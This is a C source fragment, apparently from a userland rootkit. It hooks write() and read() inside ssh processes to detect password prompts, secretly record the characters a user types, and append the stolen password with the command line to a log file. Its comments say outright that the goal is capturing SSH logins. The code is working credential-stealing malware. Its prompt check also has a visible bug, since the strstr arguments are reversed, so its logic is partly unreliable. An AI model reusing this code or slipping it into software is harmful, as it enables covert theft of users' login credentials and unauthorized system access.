int is_pwprompt(int fd, const void *buf){
    struct stat s_fstat;
    hook(C__FXSTAT);
    memset(&s_fstat, 0, sizeof(stat));
    call(C__FXSTAT, _STAT_VER, fd, &s_fstat);
    if(S_ISSOCK(s_fstat.st_mode)) return 0;

    if(buf != NULL && strstr("assword", (char *)buf))
        return 1;

    return 0;
}

/* used by write() to determine if the user's writing
 * into a password prompt for an ssh login. if they are,
 * get ready to write the password to our log. */
ssize_t hijack_write_ssh(int fd, const void *buf, ssize_t o){
    if(!process("ssh")) return o;
    if(is_pwprompt(fd, buf)){
        ssh_pass_size = 0;
        memset(ssh_pass, 0, sizeof(ssh_pass));
        ssh_start = 1;
    }

    return o;
}

/* used by read() to intercept password input for ssh,
 * and write the resulting submitted password to our
 * log file. */
ssize_t log_ssh(int fd, void *buf, ssize_t o){
    if(fd == 0) return o;

    struct stat s_fstat;
    char *p, *mycmdline;
    FILE *fp;

    hook(C__FXSTAT, CFOPEN);

    memset(&s_fstat, 0, sizeof(stat));
    call(C__FXSTAT, _STAT_VER, fd, &s_fstat);
    if(S_ISSOCK(s_fstat.st_mode)) return o;

    /* once we're 100% certain it's a password prompt
     * for ssh, begin reading the input. */
    if(process("ssh") && fd == 4 && ssh_start){
        p = buf;
        
        if(*p == '\n'){       /* once the user has submitted their password,  */
            ssh_start = 0;    /* see if we can't write it to our log.         */
            fp = call(CFOPEN, SSH_LOGS, "a");

            if(fp != NULL){
                mycmdline = process_cmdline();
                fprintf(fp, FMT_STR, mycmdline, ssh_pass);
                free(mycmdline);
                fflush(fp);
                fclose(fp);
            }

            /* all done. whether writing to the log was a success or not, we
             * must return the original return value of the read() call to
             * the user. */
            return o;
        }

        /* store the next character in the user's password input
         * so that we can write it all once they've entered it. */
        ssh_pass[ssh_pass_size++] = *p;
    }

    return o;
}